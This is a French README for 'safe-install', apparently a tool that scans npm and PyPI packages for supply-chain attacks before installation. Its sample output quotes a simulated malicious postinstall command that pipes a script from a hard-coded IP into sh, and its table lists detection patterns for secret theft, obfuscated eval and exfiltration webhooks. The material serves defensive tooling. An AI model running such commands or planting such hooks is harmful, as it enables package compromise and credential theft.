# 🛡️ safe-install

**Analyse un paquet npm ou PyPI _avant_ de l'installer.**

Les attaques par la chaîne d'approvisionnement (paquets piégés, noms qui imitent
`lodash` ou `requests`, scripts `postinstall` qui volent les tokens) touchent
régulièrement npm et PyPI. `safe-install` s'intercale avant `npm install` /
`pip install`, inspecte le paquet **sans jamais l'exécuter**, et rend un verdict :
`OK`, `WARN` ou `BLOCK`.

Exemple sur un faux paquet piégé (scénario reproduit dans les tests) :

```text
$ safe-install npm lodahs
lodahs@1.0.1 (npm)
  score   : 100/100
  verdict : BLOCK
  raisons :
    +40  nom très proche de paquet(s) populaire(s) : lodash (typosquatting ?)
    +35  le script 'postinstall' télécharge et exécute un script (curl | sh) [package.json]
    +35  lit des fichiers de secrets (clés SSH, tokens, portefeuilles) [package/index.js]
    +30  script d'installation ajouté dans cette version (absent de 1.0.0) : postinstall
    +25  script 'postinstall' exécuté automatiquement à l'installation : curl http://45.13.2.9/p.sh | sh [package.json]
    +20  le script 'postinstall' contacte une adresse IP en dur [package.json]
```

## Ce qui est vérifié

| Signal | Exemple |
|---|---|
| **Typosquatting** | `lodahs`, `expresss`, `reqeusts`, `requests-secure`, `@evil/lodash` |
| **Scripts d'installation** (npm) | `preinstall` / `install` / `postinstall`, et surtout ceux **ajoutés dans la dernière version** |
| **Installation qui exécute du code** (PyPI) | `setup.py` avec `cmdclass`, sdist sans wheel, fichiers `.pth` |
| **Code suspect** dans l'archive | `child_process`, `eval(atob(…))`, `curl … \| sh`, webhooks Discord/Telegram, IP en dur, lecture de `~/.ssh`, `.npmrc`, variables `*_TOKEN` |
| **Réputation** | paquet créé il y a moins de 30 jours, une seule version, pas de dépôt source |

Le code du paquet est téléchargé et lu **en mémoire** : rien n'est extrait sur le
disque ni exécuté. Les archives trop grosses ou trop nombreuses en fichiers sont
tronquées (protection contre les archives « bombes »).

## Installation

Aucune dépendance : Python 3.10+ et la bibliothèque standard suffisent.

```bash
git clone https://github.com/Jimo0x/safe-install && cd safe-install
pip install .
```

## Utilisation

```bash
safe-install npm express                 # analyse la dernière version
safe-install npm express@4.19.2 axios     # plusieurs paquets
safe-install pip requests==2.32.3         # PyPI
safe-install npm lodash --install         # installe seulement si rien n'est BLOQUÉ
safe-install pip flask --fast             # métadonnées seulement (rapide)
safe-install npm left-pad --json          # sortie JSON pour la CI
```

**Codes de sortie** : `0` = OK, `1` = WARN, `2` = BLOCK. Pratique en CI :

```yaml
- run: safe-install npm $(jq -r '.dependencies | keys[]' package.json) --fast
```

Si un registre est injoignable, le paquet est **bloqué** par défaut
(on préfère échouer fermé).

## Limites (honnêtement)

- C'est de l'analyse **statique par heuristiques** : un attaquant motivé peut
  obfusquer son code au-delà de ce que les motifs détectent. `safe-install`
  réduit le risque, il ne le supprime pas.
- Les dépendances **transitives** ne sont pas encore analysées (voir la feuille de route).
- La liste de paquets populaires est courte et embarquée ; un paquet légitime au
  nom proche d'un populaire peut lever un `WARN`.

## Feuille de route

- [ ] Analyse des dépendances transitives (`package-lock.json`, `requirements.txt`)
- [ ] Diff de code entre deux versions d'un même paquet
- [ ] Liste de paquets populaires téléchargée et mise en cache
- [ ] Intégration en hook `npm`/`pip` (alias de shell)

## Tests

```bash
pip install -e ".[dev]" && pytest -q
```

Les tests n'ont pas besoin du réseau : les registres sont simulés.

## Licence

MIT — voir [LICENSE](LICENSE).
# safe-install
